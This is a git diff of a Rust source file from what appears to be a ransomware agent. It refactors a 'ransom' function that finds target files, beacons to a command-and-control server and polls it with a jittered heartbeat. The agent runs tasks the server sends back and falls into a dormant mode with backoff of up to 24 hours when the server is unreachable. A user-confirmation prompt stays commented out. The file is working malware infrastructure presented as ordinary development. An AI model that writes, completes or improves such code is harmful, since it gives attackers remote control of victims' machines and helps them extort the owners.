@@ -1,11 +1,11 @@
 use rand::Rng;
-use tokio::task::JoinHandle;
 use std::io::{self, Write};
 use local_ip_address::local_ip;
 use std::sync::Arc;
 use tokio::sync::{Mutex, mpsc};
 
 
+use crate::core::agent_state::AgentState;
 use crate::utils::{logger, note, config::AppConfig};
 use crate::core::targeting;
 use crate::post::{
@@ -27,7 +27,7 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(
     let targets = targeting::discover_files(&logger, &config.target_path)?;
 
     dbg!(&targets);
-    // Ask user if wants to continue: only for testing purposes, remove later
+    // // Ask user if wants to continue: only for testing purposes, remove later
     // if !ask_user_confirmation() {
     //     logger.log("User chose not to continue. Exiting...");
     //     return Ok(());
@@ -44,6 +44,7 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(
 
 
     // Step 4: Send initial beacon to C2
+    let result_queue: ResultQueue = Arc::new(Mutex::new(None));
     let (agent_id, session_id) = beacon::initial_beacon(
         &config.server_address, 
         config.retries, 
@@ -51,109 +52,77 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(
         &logger).await;
 
     
-    let offline = if agent_id == 0 {
-        true
-    } else {
-        false
+    let offline = agent_id == 0;
+
+    // Create a channel for commands
+    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
+    // Start worker
+    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));
+
+    
+    let mut agent_state = AgentState {
+        agent_id,
+        session_id,
+        offline,
+        logger: Arc::clone(&logger),
+        result_queue,
+        tx,
+        heartbeat_handle: None
     };
     
-
-    if !offline {
-        heartbeat(Arc::clone(&logger), config, agent_id, session_id).await?;
-        // // Step 5: Heartbeat with jitter that polls for tasks and sends results
-        // let (tx, rx) = mpsc::channel::<AgentCommand>(32);
-        // let result_queue: ResultQueue = Arc::new(Mutex::new(None));
-
-        // // Start worker
-        // tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));
-
-        // let server_address = config.server_address.clone();
-        // let timeout_secs = config.timeout_seconds.clone();
-        // let tx_clone = tx.clone();
-        // let result_clone = Arc::clone(&result_queue);
-        
-        // let logger_clone = logger.clone(); // Ensure logger is Arc or implement Clone if needed
-        // let heartbeat_handle = tokio::spawn(async move {
-        //     loop {
-        //         let jitter = rand::thread_rng().gen_range(0..20);
-        //         tokio::time::sleep(std::time::Duration::from_secs(60 + jitter)).await;
-
-        //         // Get results from queue
-        //         let results = result_clone.lock().await.take();
-        //         // Send heartbeat to C2 to requests tasks
-        //         match beacon::heartbeat(
-        //             &server_address,
-        //             agent_id,
-        //             &session_id,
-        //             timeout_secs,
-        //             results,
-        //             &logger_clone
-        //         ).await {
-        //             Some(msgs) => {
-        //                 // If tasks exist, complete them and store results
-        //                 // Send results on next heartbeat
-        //                 for msg in msgs {
-        //                     let _ = tx_clone.send(msg).await;
-        //                 }
-        //             }
-        //             None => {}
-        //         }
-
-        //     }
-        // });
-
-        // heartbeat_handle.await?;
-    } else {
-        // If operating in offline mode, check every X
-        let mut interval_secs = 60; // Start with 1 min (change later)
-        let max_interval = 3600; // set cap at 1 hr (change later)
-        
-        loop {
-            logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
-            tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
-
-            let (new_agent_id, session_id) = beacon::initial_beacon(
-                &config.server_address, 
-                config.retries, 
-                config.timeout_seconds,
-                &logger).await;
-
-            if new_agent_id != 0 {
-                logger.log("Reconnected to C2. Exiting offline mode.");
-                // TODO: Reinitialize heartbeat
-                let _ = heartbeat(Arc::clone(&logger), config, agent_id, session_id).await;
-                break
+    // Run heartbeat loop forever. If no response from server, switch to offline mode until reconnected
+    loop {
+        if !agent_state.offline {
+            if agent_state.heartbeat_handle.is_none() {
+                // Only spawn if not already running
+                agent_state.heartbeat_handle = Some(agent_state.start_heartbeat(config));
             }
-
-            // Back off retry interval (capped)
-            interval_secs = std::cmp::min(interval_secs * 2, max_interval);
+        
+            // Check if the task is done
+            if let Some(handle) = agent_state.heartbeat_handle.take() {
+                match handle.await {
+                    Ok(Ok(())) => {} // still good
+                    Ok(Err(e)) => {
+                        logger.log(&format!("Heartbeat error: {e}"));
+                        agent_state.offline = true;
+                    }
+                    Err(e) => {
+                        logger.log(&format!("Task panic: {e}"));
+                        agent_state.offline = true;
+                    }
+                }
+            }
+        } else {
+            agent_state.offline_mode(config).await;
+            agent_state.offline = false;
         }
     }
-
-
-    // Step 6: Cover tracks/persistence
 
     Ok(())
 }
 
-async fn heartbeat(
-    logger: Arc<logger::Logger>, config: &AppConfig, agent_id: u64, session_id: String) 
-    -> Result<(), Box<dyn std::error::Error>> {
-
-    // Step 5: Heartbeat with jitter that polls for tasks and sends results
-    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
-    let result_queue: ResultQueue = Arc::new(Mutex::new(None));
-
-    // Start worker
-    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));
+/// Spawns a Tokio task that periodically sends a heartbeat to the C2 server.
+    /// 
+    /// The task runs an infinite loop where it:
+    /// - Waits for a randomized interval (60 seconds plus up to 20 seconds jitter).
+    /// - Retrieves results from a shared queue.
+    /// - Sends a heartbeat request to the C2 server, including any results.
+    /// - If the server responds with tasks, forwards them to a channel for processing.
+    /// 
+    /// This mechanism allows the agent to regularly check in with the C2 server,
+    /// report results, and receive new tasks asynchronously.
+async fn _heartbeat(
+    logger: Arc<logger::Logger>, config: &AppConfig, 
+    agent_id: u64, session_id: String, result_queue: &ResultQueue,
+    tx: &mpsc::Sender<AgentCommand>) 
+    -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
 
     let server_address = config.server_address.clone();
-    let timeout_secs = config.timeout_seconds.clone();
-    let tx_clone = tx.clone();
-    let result_clone = Arc::clone(&result_queue);
-    let session_id = session_id.clone();
+    let timeout_secs = config.timeout_seconds;
 
-    let logger_clone: Arc<logger::Logger> = Arc::clone(&logger);
+    let tx = tx.clone();
+    let result_queue = Arc::clone(&result_queue);
+    let logger: Arc<logger::Logger> = Arc::clone(&logger);
     
     let heartbeat_handle = tokio::spawn(async move {
         loop {
@@ -161,7 +130,7 @@ async fn heartbeat(
             tokio::time::sleep(std::time::Duration::from_secs(60 + jitter)).await;
 
             // Get results from queue
-            let results = result_clone.lock().await.take();
+            let results = result_queue.lock().await.take();
             // Send heartbeat to C2 to requests tasks
             match beacon::heartbeat(
                 &server_address,
@@ -169,25 +138,56 @@ async fn heartbeat(
                 &session_id,
                 timeout_secs,
                 results,
-                &*logger_clone
+                &*logger
             ).await {
                 Some(msgs) => {
                     // If tasks exist, complete them and store results somewhere
                     // Send results on next heartbeat
                     for msg in msgs {
-                        let _ = tx_clone.send(msg).await;
+                        let _ = tx.send(msg).await;
                     }
                 }
-                None => {}
+                None => {
+                    // Failed to send connect/send message to C2 -> switch back to offline mode
+                    return Err("C2 heartbeat failed.".into());
+                }
             }
 
         }
     });
 
-    heartbeat_handle.await?;
+    match heartbeat_handle.await {
+        Ok(Ok(())) => Ok(()), // All good
+        Ok(Err(e)) => Err(e), // Heartbeat task reported an error (e.g., C2 lost)
+        Err(join_err) => Err(format!("Heartbeat task panicked: {join_err}").into()), // Tokio join error
+    }
 
-    Ok(())
 
+}
+
+async fn _offline_mode(logger: &logger::Logger, config: &AppConfig) -> (u64, String) {
+    // If operating in offline mode, check every X
+    let mut interval_secs = 60; // Start with 1 min
+    let max_interval = 86400; // set cap at 24 hr 
+    
+    loop {
+        logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
+        tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
+
+        let (new_agent_id, session_id) = beacon::initial_beacon(
+            &config.server_address, 
+            config.retries, 
+            config.timeout_seconds,
+            &logger).await;
+
+        if new_agent_id != 0 {
+            logger.log("Reconnected to C2. Exiting offline mode.");
+            return (new_agent_id, session_id);
+        }
+
+        // Back off retry interval (capped)
+        interval_secs = std::cmp::min(interval_secs * 2, max_interval);
+    }
 }
 
 fn ask_user_confirmation() -> bool {
